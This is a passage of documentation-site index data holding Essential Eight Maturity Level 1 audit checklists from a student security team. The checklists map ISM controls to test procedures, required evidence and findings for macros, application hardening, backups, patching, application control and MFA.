logs, usage review records.\tAD Audit, Splunk\tCybersecurity GRC\tQuarterly\tInactive admin accounts reviewed and deactivated. AD group membership updated.\tnan Restrict Admin Privileges\tML1-RA\tML1-RA-10\tISM-0421\tAdmin accounts are separated from daily-use standard user accounts (no shared accounts).\tValidate dual-identity enforcement and unique IDs for admin tasks.\tUser ID records, account naming policy, IAM reports.\tIAM System, ADUC\tCybersecurity GRC\tQuarterly\tAdmin IDs use +admin suffix. Dual identities verified across IAM and ADUC exports.\tnan  ","version":"Next","tagName":"h2"},{"title":"Office Macros​","type":1,"pageTitle":"Redback_E8_ML1_Assessment_Checklist","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Essential 8 Assesment/Master Checklist/Redback_E8_ML1_Assessment_Checklist#office-macros","content":" Control Area\tControl ID\tTest ID\tISM Control ID\tTest Description\tAudit Procedure\tEvidence Required\tTools/Method Used\tResponsible Team\tFrequency\tFindings/Comments\tEvidence LocationOffice Macros\tML1-OM\tML1-OM-01\tISM-1710\tMicrosoft Office macros are disabled for all users without a documented business requirement.\tRun RSOP or review Group Policy settings; test macro execution on unapproved user accounts.\tGPO config screenshots, test results, approved user list.\tRSOP, GPMC, Office\tCybersecurity GRC\tQuarterly\tGPO restricts macro execution; unapproved user account blocked from running macro in Word.\t\\share\\redback-evidence\\ML1-OM-01-disabled.png Office Macros\tML1-OM\tML1-OM-02\tISM-1710\tA record is maintained of users approved to run macros, which matches policy enforcement.\tCompare macro-enabled group membership to access approval list.\tApproval requests, group membership exports.\tActive Directory, Confluence\tCybersecurity GRC\tQuarterly\tAD group matches Confluence approval table. No mismatches detected.\tnan Office Macros\tML1-OM\tML1-OM-03\tISM-1711\tMacros embedded in files downloaded from the internet are blocked by default.\tDownload Office files with macros and verify execution is blocked.\tE8MVT output, file logs, macro execution error screenshots.\tOffice, GPO, E8MVT\tCybersecurity GRC\tQuarterly\tE8MVT flagged macro execution error for web-downloaded document. Policy working.\tnan Office Macros\tML1-OM\tML1-OM-04\tISM-1711\tOffice is configured via Group Policy to block macros in internet-sourced files.\tReview registry keys and GPO settings enforcing internet macro blocking.\tRegistry export, Group Policy screenshots.\tRegEdit, GPMC\tCybersecurity GRC\tQuarterly\tMacroPolicy reg key value = 6 verified across Word, Excel, PowerPoint.\tnan Office Macros\tML1-OM\tML1-OM-05\tISM-1712\tAntivirus scans are triggered when Office macros are run.\tAttempt to execute a macro with EICAR test string; check AV response.\tAV logs, EICAR detection report, alerting configuration.\tE8MVT, Windows Defender, McAfee\tDevSecOps\tQuarterly\tEICAR macro detected. Alert raised and blocked by AV.\tnan Office Macros\tML1-OM\tML1-OM-06\tISM-1713\tAV engine detects and blocks known macro-based malicious payloads.\tInject known safe malicious pattern and confirm detection and alerting.\tSIEM alerts, AV block logs.\tAV Console, EICAR Macros\tCybersecurity GRC\tQuarterly\tEICAR test macro blocked. SIEM alert received and logged.\tnan Office Macros\tML1-OM\tML1-OM-07\tISM-1714\tStandard users are restricted from changing macro security settings in the Trust Center.\tAttempt to modify Trust Center settings in Word, Excel, PowerPoint.\tScreenshots of locked settings, GPO config.\tOffice Apps, GPMC\tCybersecurity GRC\tQuarterly\tTrust Center config greyed out for standard users. GPO confirmed locked state.\tnan Office Macros\tML1-OM\tML1-OM-08\tISM-1714\tAll Office apps are configured consistently to enforce macro policy across Word, Excel, and PowerPoint.\tReview registry or Group Policy enforcement across all Office components.\tConsistency checks, registry snapshots.\tOffice Deployment Tool, RegEdit\tCybersecurity GRC\tQuarterly\tRegistry export confirmed uniform settings across all Office apps.\tnan Office Macros\tML1-OM\tML1-OM-09\tISM-1715\tUpdates to Office macro policy are documented, reviewed, and approved.\tInspect change management and policy versioning records.\tChange logs, approval emails, version control history.\tConfluence, SharePoint, GitHub\tCybersecurity GRC\tAnnually\tMacro policy versioning tracked via GitHub; approvals in Confluence.\tnan Office Macros\tML1-OM\tML1-OM-10\tISM-1716\tMicrosoft Office macro usage logs are retained for audit trail and incident investigation.\tVerify log retention settings; ensure logs are centralized.\tSysmon logs, GPO logging configuration, centralized log exports.\tSIEM, Event Viewer, Syslog Server\tCybersecurity GRC\tMonthly\tLog retention enabled; logs synced to central SIEM every 24h.\tnan  ","version":"Next","tagName":"h2"},{"title":"User App Hardening​","type":1,"pageTitle":"Redback_E8_ML1_Assessment_Checklist","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Essential 8 Assesment/Master Checklist/Redback_E8_ML1_Assessment_Checklist#user-app-hardening","content":" Control Area\tControl ID\tTest ID\tISM Control ID\tTest Description\tAudit Procedure\tEvidence Required\tTools/Method Used\tResponsible Team\tFrequency\tFindings/Comments\tEvidence LocationUser App Hardening\tML1-AH\tML1-AH-01\tISM-1701\tWeb browsers do not process Java from internet-based websites.\tAttempt to load Java content in Edge from known test sites.\tScreenshot of blocked Java content, registry key verification.\tEdge browser, RegEdit, test website\tDevSecOps\tQuarterly\tEdge failed to load Java applet from test site. Registry setting confirmed.\t\\share\\redback-evidence\\ML1-AH-01-java-block.png User App Hardening\tML1-AH\tML1-AH-02\tISM-1701\tJava content is disabled in Google Chrome.\tAttempt Java content execution and verify result in Chrome.\tChrome plugin settings, screenshots, blocked content logs.\tChrome, test site, GPO\tDevSecOps\tQuarterly\tChrome plugin blocked Java by default. Screenshot shows blocked alert. User App Hardening\tML1-AH\tML1-AH-03\tISM-1701\tJava content is disabled in Mozilla Firefox.\tTest Java plugin activation and loading behavior.\tFirefox about:config, Java plugin settings.\tFirefox browser, plugin audit\tDevSecOps\tQuarterly\tJava plugin disabled in about:config. No prompt to run Java content. User App Hardening\tML1-AH\tML1-AH-04\tISM-1702\tWeb ads from the internet are blocked in Microsoft Edge.\tLoad ad-heavy test page in Edge and inspect rendering.\tScreenshots, ad-blocking extension configs, browser policy.\tEdge, test pages, GPO settings\tDevSecOps\tQuarterly\tEdge blocked banner and popup ads on test domain. Extension enabled. User App Hardening\tML1-AH\tML1-AH-05\tISM-1702\tAds from the internet are blocked in Google Chrome.\tVisit known ad sites in Chrome and validate ad blocking functionality.\tBrowser policy, plugin settings, screenshots.\tChrome, uBlock Origin, test domains\tDevSecOps\tQuarterly\tuBlock enforced via GPO. Chrome blocked all ad scripts. User App Hardening\tML1-AH\tML1-AH-06\tISM-1702\tWeb ads are blocked in Mozilla Firefox.\tTest ad rendering in Firefox with/without plugin enabled.\tAdBlock logs, Firefox settings, screenshots.\tFirefox, plugin, GPO\tDevSecOps\tQuarterly\tFirefox blocked inline and popup ads. Policy enforcement confirmed. User App Hardening\tML1-AH\tML1-AH-07\tISM-1703\tInternet Explorer 11 is unable to access internet sites or is removed.\tAttempt to open external websites using IE11 and inspect firewall/proxy logs.\tScreenshots, blocked network logs, registry settings.\tProxy logs, curl/IE header spoofing\tDevSecOps\tQuarterly\tIE11 uninstalled via policy. Access blocked in logs and UI. User App Hardening\tML1-AH\tML1-AH-08\tISM-1704\tStandard users cannot modify security settings in Microsoft Edge.\tAttempt to change Edge security settings and document access limitations.\tLocked setting indicators, GPO evidence.\tGPMC, Edge browser\tCybersecurity GRC\tQuarterly\tSettings grayed out in Edge; verified GPO lock applied. User App Hardening\tML1-AH\tML1-AH-09\tISM-1704\tSecurity settings in Google Chrome are managed and cannot be changed by standard users.\tAttempt changes to Chrome proxy or security settings.\tScreenshot of locked settings, policy verification.\tChrome Admin Console, GPO\tCybersecurity GRC\tQuarterly\tChrome settings locked. Banner shows &quot;managed by organization&quot;. User App Hardening\tML1-AH\tML1-AH-10\tISM-1704\tMozilla Firefox security settings are centrally controlled and cannot be altered by users.\tTry to change TLS/JavaScript/network settings as user; verify GPO enforcement.\tAbout:config snapshot, policy enforcement logs.\tFirefox Policy Templates, RegEdit\tCybersecurity GRC\tQuarterly\tabout:config locked. Registry policy in place for browser security.\t  ","version":"Next","tagName":"h2"},{"title":"Regular Backups​","type":1,"pageTitle":"Redback_E8_ML1_Assessment_Checklist","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Essential 8 Assesment/Master Checklist/Redback_E8_ML1_Assessment_Checklist#regular-backups","content":" Control Area\tControl ID\tTest ID\tISM Control ID\tTest Description\tAudit Procedure\tEvidence Required\tTools/Method Used\tResponsible Team\tFrequency\tFindings/Comments\tEvidence LocationRegular Backups\tML1-RB\tML1-RB-01\tISM-0455\tIdentify and document important data, software, and configuration items in BCP for backup inclusion.\tReview BCP and confirm data classification for backup.\tBusiness Continuity Plan (BCP), asset register.\tConfluence, Excel, Asset Manager\tCybersecurity GRC\tAnnually\tBCP inventory reviewed; backup-relevant config and databases listed.\t\\share\\redback-evidence\\ML1-RB-01-bcp-assets.xlsx Regular Backups\tML1-RB\tML1-RB-02\tISM-0456\tImportant data and configuration settings are backed up per BCP frequency and retention policies.\tInspect backup logs and compare to policy schedule.\tBackup job reports, retention policy, storage logs.\tVeeam, GCP Snapshot, AWS Backup\tDevSecOps\tWeekly\tSchedule aligned with policy. Logs show successful daily backup.\tnan Regular Backups\tML1-RB\tML1-RB-03\tISM-0457\tBackups are performed in a synchronised manner, enabling restoration to a common point in time.\tConfirm snapshot coordination across systems.\tTimestamps of snapshots, recovery point reports.\tZFS, RAID Logs, Cloud Sync Reports\tDevSecOps\tWeekly\tAll systems show synced snapshots within defined RPO.\tnan Regular Backups\tML1-RB\tML1-RB-04\tISM-0458\tBackups are stored securely and resiliently (e.g., encrypted, geographically separate).\tReview encryption settings and storage redundancy mechanisms.\tEncryption logs, offsite storage reports.\tGCP, AWS S3, Backup Vaults\tDevSecOps\tWeekly\tOffsite encryption enabled; S3 logs confirm cross-region replication.\tnan Regular Backups\tML1-RB\tML1-RB-05\tISM-0459\tDisaster recovery tests include restoration of data to confirm reliability.\tReview DR test results and associated recovery reports.\tRestoration logs, test reports, screenshots.\tDR Runbooks, Simulated Restore Logs\tCybersecurity GRC\tQuarterly\tTest restore completed successfully. Screenshot attached.\tnan Regular Backups\tML1-RB\tML1-RB-06\tISM-0460\tOnly authorised users can access backups; unprivileged users are restricted.\tAttempt access using standard user account and verify access denial.\tAccess logs, file permission maps, IAM policy screenshots.\tIAM Roles, ACLs, File Explorer\tDevSecOps\tQuarterly\tAccess denied for test user; IAM role confirmed.\tnan Regular Backups\tML1-RB\tML1-RB-07\tISM-0461\tBackups are immutable or protected against deletion/modification by unprivileged accounts.\tAttempt deletion or modification from unprivileged account; confirm logs.\tAudit logs, ACLs, storage-level controls.\tObject Locking, WORM Policies\tDevSecOps\tQuarterly\tDelete attempt logged and blocked. Immutable flag enforced.\tnan Regular Backups\tML1-RB\tML1-RB-08\tISM-0462\tBackup job failures are logged and promptly alerted to responsible personnel.\tReview failure alerting mechanism and past alert logs.\tAlert notification logs, escalation flowcharts.\tSIEM, Opsgenie, PagerDuty\tDevSecOps\tWeekly\tPagerDuty alert triggered on missed job. Resolved in under 2h.\tnan Regular Backups\tML1-RB\tML1-RB-09\tISM-0463\tBackup systems are regularly patched and updated to prevent exploitation of backup infrastructure.\tCheck patch levels, CVEs, and update history of backup systems.\tPatch management reports, CVE summaries.\tNessus, GVM, Patch Logs\tDevSecOps\tMonthly\tNessus scan passed. All backup nodes patched this cycle.\tnan Regular Backups\tML1-RB\tML1-RB-10\tISM-0464\tBackup logs and access events are centrally stored and retained for investigation and forensics.\tVerify central logging for backup infrastructure and access.\tSIEM logs, syslog records, retention policy evidence.\tSplunk, CloudWatch Logs, Graylog\tCybersecurity GRC\tMonthly\tLogs centralised in Splunk. Retention policy: 180 days.\tnan  ","version":"Next","tagName":"h2"},{"title":"Patch Operating Systems​","type":1,"pageTitle":"Redback_E8_ML1_Assessment_Checklist","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Essential 8 Assesment/Master Checklist/Redback_E8_ML1_Assessment_Checklist#patch-operating-systems","content":" Control Area\tControl ID\tTest ID\tISM Control ID\tTest Description\tAudit Procedure\tEvidence Required\tTools/Method Used\tResponsible Team\tFrequency\tFindings/Comments\tEvidence LocationPatch Operating Systems\tML1-PO\tML1-PO-01\tISM-1807\tAn automated method of asset discovery is run and reviewed at least fortnightly.\tValidate discovery tool schedule, logs, and exception handling.\tDiscovery logs, schedule screenshots, output files.\tQualys, Nessus, CMDB\tDevSecOps\tFortnightly\tCMDB updated via Nessus discovery every 14 days. Log verified.\t\\share\\redback-evidence\\ML1-PO-01-asset-discovery.pdf Patch Operating Systems\tML1-PO\tML1-PO-02\tISM-1808\tVulnerability scanner used has an up-to-date vulnerability database.\tCheck scanner config and verify update frequency.\tScanner version info, update logs.\tNessus, OpenVAS, GVM\tDevSecOps\tDaily\tUpdate job runs daily. Version and CVE feed logs attached.\tnan Patch Operating Systems\tML1-PO\tML1-PO-03\tISM-1698\tDaily scans are performed on operating systems of internet-facing services.\tValidate daily scan frequency; review issue triage and response logs.\tDaily scan reports, incident tickets.\tNessus Pro, InsightVM\tDevSecOps\tDaily\tNightly scan targets public-facing IPs. SIEM logs confirm regular execution.\tnan Patch Operating Systems\tML1-PO\tML1-PO-04\tISM-1699\tFortnightly scans are conducted for workstations, servers, and network devices.\tCheck scan history and review report completeness across all environments.\tFull vulnerability scan report logs.\tQualys, GVM\tDevSecOps\tFortnightly\tScan reports confirm coverage across servers, desktops, network gear.\tnan Patch Operating Systems\tML1-PO\tML1-PO-05\tISM-1876\tExploited vulnerabilities on internet-facing OSs are patched or mitigated within 48 hours.\tCompare known exploit CVE release vs. patch implementation time.\tCVE timelines, patch logs, incident response summary.\tCVE Tracker, Patch Management Tools\tDevSecOps\tAs needed\tCVE-2024-XXXX patched 34h after advisory. Logs validated.\tnan Patch Operating Systems\tML1-PO\tML1-PO-06\tISM-1876\tVulnerabilities with known exploits older than 48 hours are not present in the environment.\tScan systems for open CVEs 48 hours and validate patch presence.\tVulnerability reports, scan logs, system patch status.\tNessus, GVM\tDevSecOps\tWeekly\tWeekly scan confirms 0 open high-severity CVEs 48h.\tnan Patch Operating Systems\tML1-PO\tML1-PO-07\tISM-1690\tVulnerabilities in internet-facing operating systems are patched within two weeks.\tCompare OS patch levels to vendor release schedules.\tUpdate history, vendor advisories.\tOS Patch Logs, GCP/AWS Console\tDevSecOps\tWeekly\tPatch timelines matched vendor release for all critical fixes.\tnan Patch Operating Systems\tML1-PO\tML1-PO-08\tISM-1691\tWorkstation and server OS patches are applied within one month of release.\tMatch scan output with patch application dates; check backlog or exceptions.\tPatch cycle report, dashboard exports.\tWSUS, Linux YUM/APT Logs\tDevSecOps\tMonthly\tAll systems patched within 30-day window. No exceptions pending.\tnan Patch Operating Systems\tML1-PO\tML1-PO-09\tISM-1691\tNo OS vulnerabilities older than one month exist in any production environment.\tRun full authenticated vulnerability scan and compare to patch registry.\tVulnerability scan logs, remediation reports.\tQualys, Nessus\tDevSecOps\tMonthly\tScan logs confirm 0 critical vulnerabilities 30 days.\tnan Patch Operating Systems\tML1-PO\tML1-PO-10\tISM-1905\tUnsupported operating systems are replaced or removed from the environment.\tCompare list of active systems with vendor lifecycle documentation.\tSystem inventory, vendor EOL documentation.\tCMDB, OS Scan Tools\tDevSecOps\tQuarterly\tLegacy Windows 2012 decommissioned. CMDB updated.\tnan ","version":"Next","tagName":"h2"},{"title":"Redback_E8_ML1_Data_Warehousing_Checklist","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Essential 8 Assesment/Assessment Report/Redback_E8_ML1_Data_Warehousing_Checklist","content":"","keywords":"","version":"Next"},{"title":"Instructions​","type":1,"pageTitle":"Redback_E8_ML1_Data_Warehousing_Checklist","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Essential 8 Assesment/Assessment Report/Redback_E8_ML1_Data_Warehousing_Checklist#instructions","content":" Redback E8 ML1 Assessment Checklist – InstructionsPurpose: This workbook is designed to support Maturity Level 1 (ML1) assessments across all Essential Eight strategies. Each strategy tab contains ISM-mapped controls, audit test descriptions, and expected artefacts. What You Need to Fill In (per row): Compliance Status (Column K): Select from the dropdown list Findings/Comments (Column L): Describe the audit result or observation Evidence Location (Column M): File path or reference to supporting artefacts Date Tested (Column N): Format as DD/MM/YYYY Assessor (Column O): Your name or initials Do Not Modify: Locked columns such as test description, ISM mapping, audit procedure, or control ID Any formula or data validation dropdowns already in place Scoring Guidance: ❌ Not Implemented – No evidence the control is in place ⚠️ Partially Implemented – Some implementation but incomplete or inconsistent ✅ Implemented – Fully in place and functioning as described 🔁 Alternate Control – A compensating control exists ⛔ Not Applicable – The control is not relevant in this context Additional Notes: Please ensure all evidence referenced is stored in a central location and consistently named You can review worked examples in the first 3 rows of most tabs Need Help? Contact: Shreyas Vivek (ML1 Assessment Lead)  ","version":"Next","tagName":"h2"},{"title":"Glossary​","type":1,"pageTitle":"Redback_E8_ML1_Data_Warehousing_Checklist","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Essential 8 Assesment/Assessment Report/Redback_E8_ML1_Data_Warehousing_Checklist#glossary","content":" Term\tDefinitionControl Assessment\tThe evaluated status of a control (e.g., effective, partially effective, etc.) Responsible Team\tThe team accountable for operating or implementing the control Assessor\tThe GRC team member reviewing and recording assessment evidence Evidence Location\tPath or reference to the artefact (e.g., logs, screenshots, configs) Effective\tFully meets ISM/Essential Eight requirements Partially Effective\tImplemented but with known limitations or gaps Alternate Control\tA compensating control exists and achieves the same objective Not Implemented\tNo evidence that the control is present or functioning Not Applicable\tThe control does not apply in the system or environment being assessed  ","version":"Next","tagName":"h2"},{"title":"Application Control​","type":1,"pageTitle":"Redback_E8_ML1_Data_Warehousing_Checklist","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Essential 8 Assesment/Assessment Report/Redback_E8_ML1_Data_Warehousing_Checklist#application-control","content":" Control Area\tControl ID\tTest ID\tISM Control ID\tTest Description\tAudit Procedure\tEvidence Required\tTools/Method Used\tCompliance Status\tFindings/Comments\tEvidence Location\tDate Tested\tAssessorApplication Control\tML1-AC\tML1-AC-01\tISM-0843\tPrevent execution of EXE/COM files in user profile directories by standard users.\tAttempt to run benign EXE/COM file in temp directories or Desktop.\tExecution logs, screenshots of failed attempts.\tE8MVT, Manual Execution Test\t❌ Not Implemented\tEXE file executed from Downloads folder. No policy enforcement observed. Execution succeeded under standard user profile.\tEx: \\share\\redback-evidence\\ML1-AC-sample.png\t2025-05-17 00:00:00\tShreyas Vivek/Daezel Goyal Application Control\tML1-AC\tML1-AC-02\tISM-1870\tBlock software library files (DLL/OCX) from executing in user profile/temp folders.\tPlace DLL/OCX files in user space and attempt to invoke using standard tools.\tSystem logs, execution attempts, allowlist enforcement logs.\tE8MVT\t❌ Not Implemented\tDLL file placed in user Downloads folder. Execution attempted via script runner. No block observed; allowlist policy missing or misconfigured.\tEx: \\share\\redback-evidence\\ML1-AC-sample.png\t2025-05-17 00:00:00\tShreyas Vivek/Daezel Goyal Application Control\tML1-AC\tML1-AC-03\tISM-1657\tPrevent script file (BAT, PS, VBS, JS) execution in restricted paths.\tDeploy test scripts into temp folders and execute with user permissions.\tScreenshots of blocked script runs, log entries showing prevention.\tACVT, PowerShell\t⚠️ Partially Implemented\tPowerShell constrained language mode enabled. However, some BAT/PS scripts execute with warnings. Script control not consistently enforced across all paths.\tEx: \\share\\redback-evidence\\ML1-AC-sample.png\t2025-05-17 00:00:00\tShreyas Vivek/Daezel Goyal Application Control\tML1-AC\tML1-AC-04\tISM-1657\tPrevent installation via MSI/MST/MSP in non-privileged locations.\tAttempt to install dummy MSI via user Desktop or Downloads.\tE8MVT reports, MSI install logs, endpoint monitoring logs.\tE8MVT\t❌ Not Implemented\tMSI installer run from Desktop. Execution allowed. No endpoint policy enforcement detected. User notification logs captured.\tEx: \\share\\redback-evidence\\ML1-AC-sample.png\t2025-05-17 00:00:00\tShreyas Vivek/Daezel Goyal Application Control\tML1-AC\tML1-AC-05\tISM-1657\tBlock execution of Compiled HTML (CHM) files from temp/user locations.\tRun benign CHM files from various folders and log behavior.\tScreenshot and CHM handling logs.\tManual Test, E8MVT\t❌ Not Implemented\tCHM file opened from %UserProfile%\\Downloads. Help viewer launched without warning. No restriction enforced.\tEx: \\share\\redback-evidence\\ML1-AC-sample.png\t2025-05-17 00:00:00\tShreyas Vivek/Daezel Goyal Application Control\tML1-AC\tML1-AC-06\tISM-1657\tBlock execution of HTML applications (HTA) from browser cache or download folders.\tAttempt to run HTA file from Downloads directory.\tBrowser logs, application policy evidence, HTA test file logs.\tE8MVT, Manual Browser Test\t❌ Not Implemented\tHTA file opened in Edge from Downloads. Script executed. Policy to block HTA not present or bypassed. Logged for review.\tEx: \\share\\redback-evidence\\ML1-AC-sample.png\t2025-05-17 00:00:00\tShreyas Vivek/Daezel Goyal Application Control\tML1-AC\tML1-AC-07\tISM-1657\tBlock Control Panel Applet (CPL) execution from non-system folders.\tRun benign CPL from Downloads and verify execution is blocked.\tACVT reports, Windows logs, allowlist policies.\tACVT\t❌ Not Implemented\tCPL file accessed from temp folder. Control Panel launched successfully. GPO setting to restrict non-system CPLs not applied.\tEx: \\share\\redback-evidence\\ML1-AC-sample.png\t2025-05-17 00:00:00\tShreyas Vivek/Daezel Goyal Application Control\tML1-AC\tML1-AC-08\tISM-1657\tApplication allowlisting enforced via policy and managed centrally.\tReview allowlist management system and policy distribution (e.g., Intune, GPO).\tAllowlist configuration files, policy logs.\tGroup Policy, Config Audit\t⛔ Not Applicable\tAllowlisting is managed centrally via Intune. Whitelist rules are confirmed in policy diff logs. No local allowlist policy deployed by this team.\tEx: \\share\\redback-evidence\\ML1-AC-sample.png\t2025-05-17 00:00:00\tShreyas Vivek/Daezel Goyal Application Control\tML1-AC\tML1-AC-09\tISM-1657\tExecution prevention enforced even when file renamed or copied across locations.\tRename known executables (e.g., .txt to .exe) and attempt execution.\tTest logs, screenshots, renamed file handling logs.\tManual Tests, E8MVT\t⛔ Not Applicable\tRename execution test (e.g., .txt ➝ .exe) not applicable to TAEAVM. No local allowlist or execution control configured.\tEx: \\share\\redback-evidence\\ML1-AC-sample.png\t2025-05-17 00:00:00\tShreyas Vivek/Daezel Goyal Application Control\tML1-AC\tML1-AC-10\tISM-1657\tFile execution control verified against known bypass vectors.\tAttempt to exploit known paths (e.g., 8.3 name format, symbolic links).\tOutput of exploit test cases, logs from bypass attempts.\tE8MVT, ACVT, Script Toolkit\t⛔ Not Applicable\tSymbolic link and path-based bypass tests are not applicable to TAEAVM. Execution control not enforced or required on this VM.\tEx: \\share\\redback-evidence\\ML1-AC-sample.png\t2025-05-17 00:00:00\tShreyas Vivek/Daezel Goyal  ","version":"Next","tagName":"h2"},{"title":"Patch Applications​","type":1,"pageTitle":"Redback_E8_ML1_Data_Warehousing_Checklist","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Essential 8 Assesment/Assessment Report/Redback_E8_ML1_Data_Warehousing_Checklist#patch-applications","content":" Control Area\tControl ID\tTest ID\tISM Control ID\tTest Description\tAudit Procedure\tEvidence Required\tTools/Method Used\tCompliance Status\tFindings/Comments\tEvidence Location\tDate Tested\tAssessorPatch Applications\tML1-PA\tML1-PA-01\tISM-1807\tAutomated asset discovery runs at least fortnightly to detect new systems and applications.\tReview scan configuration and logs; validate schedule enforcement.\tScan logs, scheduler output, discovery delta reports.\tQualys, Nessus, GVM\t⛔ Not Applicable\tNot applicable – VM is managed by Deakin IT; automated discovery tools are not deployed under Redback Operations.\t\\share\\redback-evidence\\ML1-PA-sample.png\t2025-05-17 00:00:00\tShreyas Vivek/Daezel Goyal Patch Applications\tML1-PA\tML1-PA-02\tISM-1808\tVulnerability scanner uses an up-to-date vulnerability database.\tCheck database version and last update timestamps in scanner console.\tScanner config files, version logs.\tQualys, Nessus, Rapid7\t⛔ Not Applicable\tNot applicable – Vulnerability scanner configuration and update cycles are outside the scope of Redback Operations.\t\\share\\redback-evidence\\ML1-PA-sample.png\t2025-05-17 00:00:00\tShreyas Vivek/Daezel Goyal Patch Applications\tML1-PA\tML1-PA-03\tISM-1698\tVulnerability scans run daily on all internet-facing applications and services.\tValidate daily scan logs and alerting mechanisms for exposed services.\tDaily reports, alerting logs.\tNessus, Tenable.io\t⛔ Not Applicable\tNot applicable – No internet-facing services are maintained by the Data Warehousing team; scanning is handled externally.\t\\share\\redback-evidence\\ML1-PA-sample.png\t2025-05-17 00:00:00\tShreyas Vivek/Daezel Goyal Patch Applications\tML1-PA\tML1-PA-04\tISM-1699\tFortnightly scans run for office software, email clients, and browsers.\tVerify credentials, schedules, and scope of scan.\tFortnightly reports, credentialed scan logs.\tGVM, Nessus Pro\t⛔ Not Applicable\tNot applicable – Application scanning for office software and browsers is not performed by student teams.\t\\share\\redback-evidence\\ML1-PA-sample.png\t2025-05-17 00:00:00\tShreyas Vivek/Daezel Goyal Patch Applications\tML1-PA\tML1-PA-05\tISM-1876\tExploitable vulnerabilities on internet-facing services are patched within 48 hours.\tMap CVE disclosure date to patch application date and analyze lag.\tPatch timeline table, remediation logs, CVE tracker screenshots.\tCVE Scanner, Manual review\t⛔ Not Applicable\tNot applicable – Patch timelines for external-facing systems are controlled by Deakin IT; not within Redback scope.\t\\share\\redback-evidence\\ML1-PA-sample.png\t2025-05-17 00:00:00\tShreyas Vivek/Daezel Goyal Patch Applications\tML1-PA\tML1-PA-06\tISM-1876\tConfirm all known exploitable vulnerabilities older than 48 hours are patched or mitigated.\tRun patch verification and determine lag beyond allowed window.\tRemediation evidence, exception logs.\tQualys, Sysmon\t⛔ Not Applicable\tNot applicable – Verification of CVE patching is managed centrally by Deakin IT; Redback has no visibility into schedule.\t\\share\\redback-evidence\\ML1-PA-sample.png\t2025-05-17 00:00:00\tShreyas Vivek/Daezel Goyal Patch Applications\tML1-PA\tML1-PA-07\tISM-1690\tAll internet-facing apps patched within 2 weeks of patch availability.\tCompare software patch date with original vendor release.\tSystem patch logs, vendor release notes.\tPatch management dashboard\t⛔ Not Applicable\tNot applicable – Patch timelines for GitHub or other tools are tracked by DevSecOps; this does not apply to internal VMs.\t\\share\\redback-evidence\\ML1-PA-sample.png\t2025-05-17 00:00:00\tShreyas Vivek/Daezel Goyal Patch Applications\tML1-PA\tML1-PA-08\tISM-1691\tPatches for internal apps (Office, PDF, browsers) applied within one month.\tReview patch cycles and correlate version info with vendor dates.\tPatch audit reports, software version matrix.\tE8MVT, Software Inventory\t⛔ Not Applicable\tNot applicable – Office/PDF/browser patching is not monitored or enforced by Redback student teams.\t\\share\\redback-evidence\\ML1-PA-sample.png\t2025-05-17 00:00:00\tShreyas Vivek/Daezel Goyal Patch Applications\tML1-PA\tML1-PA-09\tISM-1691\tInternal applications contain no vulnerabilities older than one month.\tUse scanner to verify version compliance.\tList of vulnerable versions, patch timestamps.\tQualys, Nessus, E8MVT\t⛔ Not Applicable\tNot applicable – CVE monitoring and vulnerability remediation is not handled by Redback Operations.\t\\share\\redback-evidence\\ML1-PA-sample.png\t2025-05-17 00:00:00\tShreyas Vivek/Daezel Goyal Patch Applications\tML1-PA\tML1-PA-10\tISM-1905\tAll unsupported third-party software removed from internal and internet-facing systems.\tScan and inventory all active applications; check vendor support lifecycle.\tList of deprecated apps, decommission evidence.\tNessus, Software Asset Management\t⛔ Not Applicable\tNot applicable – Software lifecycle tracking and third-party decommissioning is a Deakin IT responsibility.\t\\share\\redback-evidence\\ML1-PA-sample.png\t2025-05-17 00:00:00\tShreyas Vivek/Daezel Goyal  ","version":"Next","tagName":"h2"},{"title":"Multi-Factor Authenticatio​","type":1,"pageTitle":"Redback_E8_ML1_Data_Warehousing_Checklist","url":"/redback-documentation/docs/cybersecurity/GRC Team/GRC-Team-Audits/Essential 8 Assesment/Assessment Report/Redback_E8_ML1_Data_Warehousing_Checklist#multi-factor-authenticatio","content":" Control Area\tControl ID\tTest ID\tISM Control ID\tTest Description\tAudit Procedure\tEvidence Required\tTools/Method Used\tCompliance Status\tFindings/Comments\tEvidence Location\tDate Tested\tAssessorMulti-Factor Authentication\tML1-MF\tML1-MF-01\tISM-1504\tMFA is enforced on all internet-facing Redback services (e.g., GitHub, GCP).\tAttempt user authentication and verify MFA challenge on login.\tAccess attempt logs, screenshots of MFA prompts, enforcement settings.\tGitHub, GCP IAM, Azure Console\t⛔ Not Applicable\tNot applicable – Redback Data Warehousing VM is not internet-facing and does not integrate directly with MFA-enforced systems.\t\\share\\redback-evidence\\ML1-MF-sample.png\t2025-05-17 00:00:00\tShreyas Vivek/Daezel Goyal Multi-Factor Authentication\tML1-MF\tML1-MF-02\tISM-1504\tMFA challenge is triggered for remote desktop access to internal systems.\tPerform test RDP session and check for MFA prompt.\tVPN/RDP access logs, security group enforcement evidence.\tAzure AD, Duo, RDP Config\t⛔ Not Applicable\tNot applicable – No RDP or remote access is provisioned to the VM; managed internally by Deakin IT without MFA controls at the student level.\t\\share\\redback-evidence\\ML1-MF-sample.png\t2025-05-17 00:00:00\tShreyas Vivek/Daezel Goyal Multi-Factor Authentication\tML1-MF\tML1-MF-03\tISM-1679\tAll other internet-facing systems require MFA on login.\tEnumerate services; attempt user login; confirm MFA challenge.\tMFA logs, system login records, user directory screenshots.\tOkta, PingID, Azure MFA\t⛔ Not Applicable\tNot applicable – The team does not operate or manage external-facing services requiring MFA login.\t\\share\\redback-evidence\\ML1-MF-sample.png\t2025-05-17 00:00:00\tShreyas Vivek/Daezel Goyal Multi-Factor Authentication\tML1-MF\tML1-MF-04\tISM-1679\tMFA enforced on third-party services handling sensitive Redback data.\tIdentify third-party vendors and check their MFA configuration.\tThird-party admin console screenshots, vendor policy docs.\tAdmin Portals, Vendor Reviews\t⛔ Not Applicable\tNot applicable – No third-party vendors or systems handling sensitive Redback data are used by the Data Warehousing 